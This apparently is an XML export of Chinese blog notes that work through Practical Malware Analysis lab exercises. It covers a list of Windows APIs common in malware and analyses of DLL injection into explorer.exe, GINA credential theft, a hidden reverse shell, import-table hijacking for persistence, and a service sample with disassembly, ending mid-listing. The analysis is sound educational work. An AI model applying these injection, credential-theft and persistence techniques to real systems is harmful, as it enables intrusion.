2、启动器恶意代码是如何隐蔽运行的？进程的替换技术。 3、恶意代码负载存储在哪里？资源节中。 4、恶意负载是如何被保护的？异或加密。 5、字符串列表是如何被保护的？异或加密。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码常用API]]></title>
    <url>%2F2020%2F10%2F16%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%B8%B8%E7%94%A8API%2F</url>
    <content type="text"><![CDATA[1、文件系统函数1、CreateFile这个函数被用来创建和打开文件。 123456789HANDLE CreateFile( LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDistribution, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile); 2、ReadFile和WriteFile这些函数被用来Madui对文件进行读和写。 123456789101112131415BOOL ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped); C3、CreateFileMapping和MapViewOfFileCreateFileMapping函数复制从磁盘上加载一个文件到内存中。MapViewOfFile函数返回一个指向映射的基地址指针。 12345678910111213141516HANDLE CreateFileMapping( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName);LPVOID MapViewOfFile( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, DWORD dwNumberOfBytesToMap); 2、常用注册表函数1、RegOpenKeyEx打开一个zg注册表进行编辑和查询。 12345678910LONG RegOpenKeyEx( HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);``` ### 2、RegSetValueEx添加一个新值到注册表，并设置它的数值。 LONG RegSetValueEx( HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, CONST BYTE *lpData, DWORD cbData); 12### 3、RegGetValue返回注册表中一个值的数值。 LONG RegGetKeySecurity( HKEY hKey, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor, LPDWORD lpcbSecurityDescriptor); 123## 3、WinINet API### 1、InternetOpen初始化一个到互联网的连接 void InternetOpenA( LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags); 12### 2、InternetOpenUrl访问一个URL void InternetOpenUrlA( HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext); 12### 3、InternetReadFile和ReadFile允许程序从一个来自互联网的下载文件中读取数据。 BOOLAPI InternetReadFile( HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead); BOOL ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped); 123## 4、进程### 1、CreateProcess创建一个新进程。 BOOL CreateProcessA( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); 123## 5、线程### 1、CreateThread创建一个线程 HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); 123## 6、服务### 1、OpenSCManger返回一个服务控制管理器的句柄，它被用来进行所以后续与服务相关的函数调用。 SC_HANDLE OpenSCManagerA( LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess); 12### 2、CreateService添加一个新服务到服务控制管理器，并且允许调用者指定服务是否在引导时自动启动，或者必须手动启动。 SC_HANDLE CreateServiceA( SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword); 12### 3、StartService启动一个服务。 BOOL StartServiceA( SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab12-01]]></title>
    <url>%2F2020%2F10%2F15%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab12-01%2F</url>
    <content type="text"><![CDATA[问题1、在你运行恶意代码可执行文件时，会发生什么？程序弹出了一个对话框，而这个对话框每分钟都会出现一次。 2、哪个进程会被注入？这段程序一开始是在解析psapi.dll中的用于枚举进程的函数。连续使用了三次LoadLibrary以及GetProcAddress的组合来解析这三个函数。并且将获取的函数地址分别保存在dword_408714、dword_40870C以及dword_408710中。之后程序在0x004011BC的位置调用了myEnumProcess这个函数，它能够获取系统中每一个进程对象的PID值。接下来是一个循环操作，对枚举出来的PID值进行分析。sub_401000函数是在查找进程中是否包含有explorer.exe这个进程。一旦这个进程存在，那么sub_401000这个函数就会返回1，并且main函数就会调用OpenProcess来打开一个指向它的句柄。如果恶意程序能够成功获得explorer.exe这个进程的句柄，那么程序就会利用这个句柄来操纵这个进程： 获取句柄后，通过VirtualAllocEx这个函数在explorer.exe这个进程中分配空间，分配成功的话然后利用函数WriteProcessMemory来向explorer.exe中写入数据，程序使用GetModuleHandle和GetProcAddress来获取kernel32.dll中的LoadLibraryA函数的地址。并将这个地址写入lpStartAddress中，并成为了CreateRemoteThread函数的参数，这样就可以强制explorer.exe调用LoadLibraryA这个函数。这个恶意程序执行了DLL注入的操作，将Lab12-01.dll注入到了explorer.exe进程里面。 3、你如何能够让恶意代码停止弹出窗口？重启计算机或者结束explorer.exe这个进程。 4、这个恶意代码样本是如何工作的？通过对Lab12-01.dll中sub_10001030这个函数进行分析，可以看到这个程序一开始会创建线程，这个线程的功能就是调用MessageBoxA这个函数，并且显示当前这个程序已经运行了多少分钟。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab11-01]]></title>
    <url>%2F2020%2F10%2F08%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab11-01%2F</url>
    <content type="text"><![CDATA[1、问题首先用Strings查看一下字符串：我们可以看到字符串GinaDLL以及Winlogon这个注册表的位置。在Windows XP系统中，恶意程序可以使用微软图形识别和验证界面（GINA）拦截技术来窃取用户的登陆凭证。通过PEID我们可以看到很多关于资源的API函数。可以猜测它对资源进行了某些操作，接下来用Resource Hacker来查看一下这个程序的资源。用Resource Hacker打开这个程序，可以发现程序的资源中隐藏着一个PE文件，我们将其提取出来，可以发现是一个dll文件。运行该程序，使用promon对其行为进行监控，发现它释放了一个名为msgina32.dll的文件，通过md5码比对，可以看到从资源中提取出的dll与该dll文件md5码一致，说明它们是同一个文件。我们再来分析一下msgina32.dll这个文件，利用Strings查看一下这个DLL文件：在这里我们可以看到很多以“Wlx”为开头的函数。msgina32.dll这个恶意程序截获了Winlogon与msgina.dll之间的通信，为了让系统能够正常工作，它必须将登录凭证信息传递给msgina.dll。为了完成这项工作，恶意程序必须包含GINA要求的所有导出函数。下面来分析一下导出函数，首先看一下WlxLoggedOnSAS。可以看到，这里现将字符串“WlxLoggedOnSAS”作为参数压栈，之后调用了sub_10001000这个函数。然后跳转到该函数的返回值的位置继续执行。可以进入这个函数来分析一下：可以看到，这里使用了我们刚才所获取的msgina.dll的句柄以及WlxLoggedOnSAS这个字符串，并且调用了GetProcAddress来获取msgina.dll中的WlxLoggedOnSAS函数的地址。这样就能够实现该函数的正常调用。WlxLoggedOutSAS这个函数在系统注销的时候被调用，并且包含一些额外的代码。我们进入进入sub_10001570函数可以看到这段代码的目的是将日期、时间以及登陆凭证等信息写入到msutil32.sys这个文件里面。 1、这个恶意代码向磁盘释放了什么？恶意程序从资源节中提取出名为msgina32.dll的文件，将其释放到硬盘上。 2、这个恶意代码如何进行驻留？恶意程序将自己添加进注册表：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL中。这使得系统重启后，msgina32.dll将被加载。 3、这个恶意代码如何窃取用户登录凭证？恶意程序使用GINA拦截并窃取用户登陆凭证。 4、这个恶意代码对窃取的证书做了什么处理？msgina32.dll能够拦截所有提交到系统的用户登陆凭证。而恶意程序会把存储登录情况的日志文件（msutil32.sys）保存到系统目录里面。 5、如何在你的测试环境让这个恶意代码获得用户登录凭证？重启计算机，这样就能够找到这个存储着登录信息的文件。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab09-03]]></title>
    <url>%2F2020%2F09%2F13%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab09-03%2F</url>
    <content type="text"><![CDATA[1、问题首先用PEID查看恶意程序的导入表，可以发现，导入表中有四个dll被导入。再用IDA载入恶意程序，发现导入函数中存在对LoadLibraryA的调用，对其交叉引用，可以发现有两处地方调用了这个函数。 可以发现，LoadLibraryA导入了DLL3.dll以及user32.dll这两个dll。 1、Lab09-03.exe导入了哪些DLL？kernel32.dll、netapi32.dll、user32.dll、DLL1.dll、DLL2.dll、DLL3.dll 2、DLL1.dll、DLL2.dll、DLL3.dll要求的基地址是多少？用PEID分别载入三个dll，可以发现他们要求的基地址都是0x10000000。 3、当使用OllDbg调试Lab09-03.exe时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？可以看到DLL1.dll的基地址是0x00390000，DLL2.dll的基地址是0x003A0000，DLL3.dll的基地址为0x00400000。 4、Lab09-03.exe调用DLL1.dll中的一个导入函数时，这个导入函数都做了什么？在Lab09-03.exe中我们可以看到，main函数调用了DLL1.dll中的DLL1Print这个函数。用IDA载入DLL1.dll，来到DLL1Print这个函数的位置。可以发现这里有一个函数调用sub_10001038，它一共是有两个参数，第一个参数是一个字符串“DLL 1 mystery data %d\n”。可以认为sub_10001038是一个printf函数。对第二个参数进行交叉引用，可以发现，在dllmain中对其进行了写的操作，可以发现，dword_10008030所保存的就是GetCurrentProcessId的返回值，说明它所保存的就是当前进程的id值。那么也就知道了，DLL1Print函数的功能就是打印出当前进程的id值。 5、当Lab09-03.exe使用WriteFile函数时，它写入的文件名是什么？ecx的值是由hObject决定的，而hObject是DLL2ReturnJ的返回值，那么我们这里就应当分析一下DLL2.dll这个文件。用IDA载入DLL2.dll。找到DLL2ReturnJ这个函数，可以看到，这个函数仅仅是将dword_1000B078这个参数传递给eax然后返回。对dword_1000B078进行交叉引用。可以发现，函数调用了CreateFileA，返回值赋给了dword_1000B078。这样我们就知道了，WriteFile的写入对象，其实就是temp.exe。 6、当Lab09-03.exe使用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？NetScheduleJobAdd这个函数的作用就在于制定一个工作任务，并且在未来的一个特定的时间来执行。这个函数的第二个参数Buffer，是一个指向AT_INFO结构的指针，该结构用于描述我们所提交的任务。程序首先调用了LoadLibrary来加载DLL3.dll，接着利用GetProcAddress获取了DLL3Print以及DLL3GetStructure这两个函数的地址。可以看到，DLL3所打印的神秘数据是WideCharStr的内容，通过交叉引用可以发现，这个变量在DllMain中出现过。可以发现，这里调用了MultiByteToWideChar，这个函数用于将多字节转换成宽字符的形式。在这里，它会将lpWideCharStr参数的内容进行转换，保存在WideCharStr中。而lpWideCharStr中的内容就是“ping www.malwareanalysisbook.com”这段字符串在内存中的地址。DLL3的神秘数据就是该字符串在内存中的地址。我们知道，NetScheduleJobAdd的第二个参数是一个AT_INFO结构，那么其实dword_1000B0A0中的内容就是一个结构体。为了显示出这个结构体，我们可以来到Structures窗口按下键盘上的Insert键，选择“添加标准的结构体”，添加AT_INFO结构。然后来到dword_1000B0A0在内存中的位置，选择菜单中的Edit下面的Struct Var，单击AT_INFO，就转换成功了： 7、在运行或调试Lab09-03.exe时，你会看到Lab09-03.exe打印出三块神秘数据。DLL1、DLL2、DLL3、的神秘数据分别是什么？DLL1的神秘数据就是当前进程的id值。DLL2的神秘数据是打开temp.txt文件的句柄。DLL3的神秘数据是字符串“ping www.malwareanalysisbook.com”在内存中的地址。 8、如何将DLL2.dll加载到IDA Pro中，使得它与OllyDbg使用的加载地址匹配？我们在IDA中载入DLL2.dll时，选择“Manual load”，再输入OD中相应的加载地址即可。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab09-02]]></title>
    <url>%2F2020%2F09%2F11%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab09-02%2F</url>
    <content type="text"><![CDATA[1、问题首先用strings.exe载入Lab09-02.exe，查看一下字符串。可以看到一系列的导入函数以及cmd这个字符串。接下来用IDA和OD将这个程序载入进行分析。根据IAD的main函数地址0x00401128，令OD跳转到mian函数的位置，下个断点，运行到这里。可以看到这段代码出现了一串mov指令将一系列字节压栈。利用IDA直接将这些字节转换。在OD中运行并跟踪这个栈空间。接下来调用了GetModuleFileNameA这个函数，用于获得当前运行程序的完整路径。然后又调用了Lab09-02.00401550这个函数，在IDA中我们可以看到，这个函数被解析为_strrchr，并且将刚刚获取到的文件路径以及“\”作为函数参数压栈。这个函数用于获取当前的文件名称。接下来调用了_strcmp这个函数，将ocl.exe与Lab09-02.exe这两个字符串进行比较。如果不相等，就结束程序。综合来看，为了让程序能够正常运行，我们应该将文件名该文ocl.exe。将文件名修改后，程序可以成功执行，接下来调用了与套接字相关的函数，然后调用了sub_401089这个函数。我们在OD中直接跳转到这个函数。通过观察栈空间中的内容可以知道，这个函数的一个参数就是最开始拷贝到栈上的“1qaz2wsx3edc”这段字符串，另一个参数是一个数据缓冲区，其中的内容目前还不能够识别。接下来在IDA中进入这个函数，可以发现这是一个循环操作。按下F5键，将汇编代码转换为C语言代码。通过分析可以看出，这段代码对压入的字符串“1qaz2wsx3edc”进行了一个异或操作，应该是解密的过程。我们在OD中0x0040110C位置下一个断点，然后按F9运行，对异或后的数据进行观察。可以看到，这个恶意程序解析出了一个域名www.practicalmalwareanalysis.com。解析出的域名作为了函数gethostbyname的参数，这个函数会返回一个IP地址，并且填充sockaddr_in结构。如果该函数执行失败，则会休眠30秒，再跳回main函数开始的位置，不断重复这一过程。如果该函数执行成功，可以看到参数为0x270F的htons的函数调用，它用于将主机字节顺序转换为网络字节顺序。然后调用connect函数来尝试连接远程主机。不论连接的成功与否，最终都会休眠30秒，然后再跳回main函数开始的位置，不断循环。如果能够连接成功，那么在休眠前，会调用位于0x004013A9位置的sub_401000函数。这是一个反向的shell，它是一种往远程机器发送shell命令的技术。我们看到，在CreateProcessA这个函数被调用之前，传递给它的STARTUPINFO结构被修改了，而该结构用于指定新进程的主窗口特性。首先可以看到，StartupInfo.wShowWindow的值被设置为了0，表示它会以窗口隐藏的方式运行，而运行的对象就是cmd.exe，所以受害用户是看不到程序运行的。接着我们可以看到STARTUPINFO结构中的标准流被设置为一个套接字，这也就直接绑定了套接字和cmd.exe的标准流，所以cmd.exe被启动后，所有经过套接字的数据都将发送到cmd.exe，并且cmd.exe产生的所有输出都将通过套接字发出。 1、在二进制文件中，你看到的静态字符串是什么？cmd 2、当你运行这个二进制文件时，会发生什么？什么都没有发生，需要更改文件名。 3、怎样让恶意代码的攻击负载（payload）获得运行？将文件名改为ocl.exe。 4、在地址0x00401133处发生了什么？将两段字符串拷贝到栈上。 5、传递给子例程（函数）0x00401089的参数是什么？一个参数就是最开始拷贝到栈上的“1qaz2wsx3edc”这段字符串，另一个参数是一个数据缓冲区. 6、恶意代码使用的域名是什么？www.practicalmalwareanalysis.com 7、恶意代码使用什么编码函数来混淆域名？异或 8、恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？隐藏cmd.exe这个窗口运行shell。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab07-03]]></title>
    <url>%2F2020%2F08%2F22%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab07-03%2F</url>
    <content type="text"><![CDATA[问题首先用PEID查看一下Lab07-03.exe的导入表信息。在这里我们发现了CreateFileA、CreateFileMappingA以及MapViewOfFile，说明这个程序很可能会打开一个文件，并将其映射到内存中。而FindFirstFileA以及FindNextFileA函数，说明这个程序会在计算机中搜索文件或目录。CopyFileA说明这个程序会进行文件的拷贝。打开ida，查看一下字符串。我们可以看到，两个非常相像的字符串“kerne132.dll”以及“kernel32.dll”。我们可以猜测这个程序会在C:\windows\system32目录下创建一个kerne132.dll文件。接下来可以利用ida来检查一下Lab07-03.dll这个文件：这里出现了一个IP地址，说明这个恶意程序很可能会连接到这个地址。同时，查看一下导出函数，可以发现，在ws2_32.dll中发现了通过网络发送和接收数据所需要的所有函数。并且在kernel32.dll中，发现这里出现了与互斥量相关的函数，还有一个CreateProcessA函数，说明它很可能会创建一个进程。 分析DLL：我们首先来到DllMain的位置，打开FunctionsCallView，通过查看函数调用来阅读代码。第一个调用的是库函数__alloca_probe，用于分配空间。接着调用的是OpenMutexA与CreateMutexA，主要用于保证在同一时间只有这个恶意程序的一个实例在运行。接下来的一系列函数运用的socket套接字来建立远程的连接，并且要传输与接收数据。这个函数最终会调用Sleep或者CreateProcess。在这里我们并不知道什么传输了哪些数据或者创建了哪些进程，但是依据上面的分析可以猜测这个dll的功能。由于它发送并且接收了数据，并且还创建了进程，那么对于它的功能的最好的解释就是它被设计用来从一个远程计算机接收命令。可以看到在connect的上方，有一个inet_addr的函数调用，它使用了固定的IP地址“127.26.152.13”，说明程序会尝试连接到这个地址。接下来可以看到在send的上方有一个buf，这个参数保存的就是将要通过网络发送的数据，并且ida也已经识别出，这个位置的字符串是“hello”。接下来是一个recv函数的调用，然后调用了strncmp函数，用于比较收到的5个字符是不是“sleep”，如果是的话，执行sleep函数休眠60秒。比对4个字符，判定接收到的是不是“exec”，如果是，那么就会调用接下来的CreateProcess函数，通过lpCommandLine这个参数可以知道要创建的进程，我们发现了CommandLine的定义是0FFBh，这说明它会接收缓冲区中保存的任意5字节的东西。所以从远程服务器中接受到的字符串是exec FullPathOfProgramToRun。它会用FullPathOfProgramToRun来调用CreateProcessA。可以知道这个dll程序实现了后门功能，允许攻击者发送消息来启动本地系统上的可执行文件。 分析EXE：打开ida。可以看到，程序首先会对main函数中的第一个参数argc的值进行判定，如果这个值不等于2，那么程序就会退出。接着程序会将argv[1]，也就是第二个参数具体的内容赋给eax，并将一段字符串赋给esi。接下来程序就会将eax以及esi中的内容进行比较，如果二者不同，那么程序就会退出，相同的情况下，才会继续执行。也就是说，为了使这个程序得到完整的执行，我们需要在命令提示符中输入以下代码： 1Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE 在IDA中可以看到，出现了一系列的CreateFile、CreateFileMapping以及MapViewOfFile的调用，分别将系统中的kernel32.dll以及恶意程序Lab07-03.dll映射到内存中。接下来程序接连调用了sub_401040以及sub_401070。这些函数相对较短且没有相互调用。这些函数在比较内存，计算偏移，或者写入内存。我们暂且跳过。可以看到这里调用了CloseHandle函数用于句柄的关闭，说明此时程序已经完成了两个文件在内存中的相关操作。然后调用了CopyFile函数，将Lab07-03.dll改为“kerne132.dll”并复制到system32目录中。接下来出现了一个函数调用，并且使用“C:*”作为它的参数。我们可以双击进入这个sub_4011E0进行分析：首先可以看到，这个函数的第一个参数被IDA标记为了lpFileName，它可能是一个文件名，因为接下来它被作为参数赋给了文件查找函数FindFirstFileA，这里是要搜索整个C盘目录。这里出现了stricmp函数，用于比较两个字符串，而且不区分大小写。这里是在将字符串Str1和“.exe”进行比较，如果匹配成功，那么就执行sub_4010A0处的函数。那么很明显，这个程序其实就是在搜索C盘中的所有.exe程序，并且如果找到exe程序，那么就调用sub_4010A0来进行下一步的操作。下面我们可以进入这个函数分析。在这个函数中，我们看到它调用了CreateFile、CreateFileMapping以及MapViewOfFile来将找到的exe程序映射到内存中。接下来还有很多IsBadReadPtr函数，用来检查进程是否有权限访问指定的内存块。接下来可以看到一个stricmp函数，代码如下：这里是将Str1和“kernel32.dll”进行比较。如果能够匹配，下面就出现了repne scasb以及rep movsd指令，这两个指令等价于strlen以及memcpy这两个函数。后者会将esi中的内容覆盖到edi中。这里可以看到，esi中的内容是dword_403010，而edi中的内容是stricmp的Str1参数的内容。这里我们可以知道这个恶意程序其实会查找C盘中的所有exe程序，将这些程序的导入表中的kernel32.dll修改为kerne132.dll，这样一来，每当这些exe程序运行的时候，就会自动加载恶意DLL程序，实现后门的功能。 1、这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？这个程序通过复制一个恶意dll文件到C:\Windows\System32目录，并修改C盘中的所有导入kernel32.dll的Exe程序，让这些程序导入该恶意dll程序，从而达到持久化的驻留。 2、这个恶意代码的两个明显的基于主机特征是什么？一个是经过伪造的文件“kern132.dll”，另一个是名为SADFHUHF的互斥量。 3、这个程序的目的是什么？这个程序的目的是创建一个难以删除的后门，来连接一个远程主机。这个后门一共有两个命令，一个用于执行指令创建进程，一个用来休眠。 4、一旦这个恶意代码被安装，你如何移除它？这个程序很难被删除，因为它会感染C盘中的所有exe文件。最好的办法是写一个程序，用于修改所有被感染的文件，将它们导入表中伪造的dll文件名修改为真实的dll文件名称。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab07-02]]></title>
    <url>%2F2020%2F08%2F19%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab07-02%2F</url>
    <content type="text"><![CDATA[问题用ida打开Lab07-02.exe，查看恶意程序的导入表。可以发现，该样本的的函数导入表并没有文件、服务及注册表的操作。所以可以判断该样本没有持久化驻留的行为，运行一次便退出了。这个程序首先调用了OleInitialize用于初始化组件对象模型库，之后调用CoCreateInstance用于创建一个COM的对象。返回的COM对象被保存在栈上的一个变量中，IDA将它标记为ppv。为了判断这个程序在使用什么COM功能，我们需要检查接口标识符（IID）以及类标识符（CLSID）。首先看一下riid：可以看到，riid的值为D30C1661-CDAF-11D0-8A3E-00C04FC9E26E。 接下来再看一下rclsid：可以看到，rclsid的值为0002DF01-0000-0000-C000-000000000046。通过搜索查看注册表键值，可以知道这个IID对应IwebBrowser2，CLSID对应Internet Explorer。可以看到，这段代码首先将之前创建的COM对象（这里表示为ppv）的地址赋给了eax，之后这个eax中的内容又赋给了edx，也就是说，此时的edx指向的就是刚才所创建的COM对象的基址。接下来的call函数调用的是位于这个基址加上0x2C处的内容。通过ida的Structures视图，按下Insert键，出现定义结构提示框，但由于IDA已经有IwebBrowser2的结构定义了，所以我们直接点Add standard structure按钮查询IWebBrowser2结构。添加完IWebBrowser2结构后，回到[edx+2Ch]处点击右键，便会出现IWebBrowser2Vtbl.Navigate的标识。这个Navigate函数会允许程序启动Internet Explorer，并且访问一个Web地址。之后程序会调用一些清理函数，清理完毕，程序也就终止了 1、这个程序如何完成持久化驻留？这个函数不会进行持久化驻留。 2、这个程序的目的是什么？这个程序会显示一个网页。 3、这个程序什么时候完成执行？这个程序在完成网页的显示后，就完成了执行。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab07-01]]></title>
    <url>%2F2020%2F08%2F14%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab07-01%2F</url>
    <content type="text"><![CDATA[问题首先使用PEiD来查看一下程序的导入表：在导入表的ADVAPI32.dll这个动态链接库中，可以看到CreateServiceA以及OpenSCManagerA这两个API函数，说明这个恶意程序很可能会创建一个服务，来保证它会在系统被重启后运行。WININET.dll这个动态链接库中的InternetOpenUrlA以及InternetOpenA说明这个程序可能会连接到一个网站。首先看一下这个恶意程序的main函数： 123456789101112131415161718192021222324; int __cdecl main(int argc, const char **argv, const char **envp)_main proc nearServiceStartTable= SERVICE_TABLE_ENTRYA ptr -10hvar_8= dword ptr -8var_4= dword ptr -4argc= dword ptr 4argv= dword ptr 8envp= dword ptr 0Chsub esp, 10hlea eax, [esp+10h+ServiceStartTable]mov [esp+10h+ServiceStartTable.lpServiceName], offset aMalservice ; &quot;MalService&quot;push eax ; lpServiceStartTablemov [esp+14h+ServiceStartTable.lpServiceProc], offset sub_401040mov [esp+14h+var_8], 0mov [esp+14h+var_4], 0call ds:StartServiceCtrlDispatcherApush 0push 0call sub_401040add esp, 18hretn_main endp 这个main函数出现了StartServiceCtrlDispatcherA这个函数，它主要用来实现一个服务。这个函数指定了服务控制管理器所要调用的服务控制函数。这里它所指定的函数就是sub_401040，这个函数会在调用StartServiceCtrlDispatcherA之后被调用。我们进入sub_401040看看。 12345678910111213sub_401040 proc nearSystemTime= SYSTEMTIME ptr -400hFileTime= _FILETIME ptr -3F0hFilename= byte ptr -3E8hsub esp, 400hpush offset Name ; &quot;HGL345&quot;push 0 ; bInheritHandlepush 1F0001h ; dwDesiredAccesscall ds:OpenMutexAtest eax, eaxjz short loc_401064 函数首先调用了OpenMutexA函数，这个函数会试图获取一个名为“HGL345”的互斥量的句柄，如果这个互斥量存在，那么程序就调用ExitProcess来结束程序。如果这个互斥量不存在，那就会执行右边的流程。 12345push esipush offset Name ; &quot;HGL345&quot;push 0 ; bInitialOwnerpush 0 ; lpMutexAttributescall ds:CreateMutexA 因为互斥量不存在，所以这里就调用CreateMutexA来创建一个名为HGL345的互斥量。 1234567891011121314151617181920212223242526push 3 ; dwDesiredAccesspush 0 ; lpDatabaseNamepush 0 ; lpMachineNamecall ds:OpenSCManagerAmov esi, eaxcall ds:GetCurrentProcesslea eax, [esp+404h+Filename]push 3E8h ; nSizepush eax ; lpFilenamepush 0 ; hModulecall ds:GetModuleFileNameApush 0 ; lpPasswordpush 0 ; lpServiceStartNamepush 0 ; lpDependenciespush 0 ; lpdwTagIdlea ecx, [esp+414h+Filename]push 0 ; lpLoadOrderGrouppush ecx ; lpBinaryPathNamepush 0 ; dwErrorControlpush 2 ; dwStartTypepush 10h ; dwServiceTypepush 2 ; dwDesiredAccesspush offset DisplayName ; &quot;Malservice&quot;push offset DisplayName ; &quot;Malservice&quot;push esi ; hSCManagercall ds:CreateServiceA 之后通过OpenSCManagerA这个函数打开一个服务控制管理器的句柄，以便这个恶意程序可以添加或修改服务。接下来使用GetCurrentProcess来获取当前进程的伪句柄。然后调用GetModuleFileNameA获取当前所运行程序的完整路径。当获取到完整的路径以后，这个路径就会被CreateServiceA用来创建一个新的服务。 1234567891011121314151617181920212223242526272829xor edx, edxlea eax, [esp+404h+FileTime]mov dword ptr [esp+404h+SystemTime.wYear], edxlea ecx, [esp+404h+SystemTime]mov dword ptr [esp+404h+SystemTime.wDayOfWeek], edxpush eax ; lpFileTimemov dword ptr [esp+408h+SystemTime.wHour], edxpush ecx ; lpSystemTimemov dword ptr [esp+40Ch+SystemTime.wSecond], edxmov [esp+40Ch+SystemTime.wYear], 2100call ds:SystemTimeToFileTimepush 0 ; lpTimerNamepush 0 ; bManualResetpush 0 ; lpTimerAttributescall ds:CreateWaitableTimerApush 0 ; fResumepush 0 ; lpArgToCompletionRoutinepush 0 ; pfnCompletionRoutinelea edx, [esp+410h+FileTime]mov esi, eaxpush 0 ; lPeriodpush edx ; lpDueTimepush esi ; hTimercall ds:SetWaitableTimerpush 0FFFFFFFFh ; dwMillisecondspush esi ; hHandlecall ds:WaitForSingleObjecttest eax, eaxjnz short loc_40113B 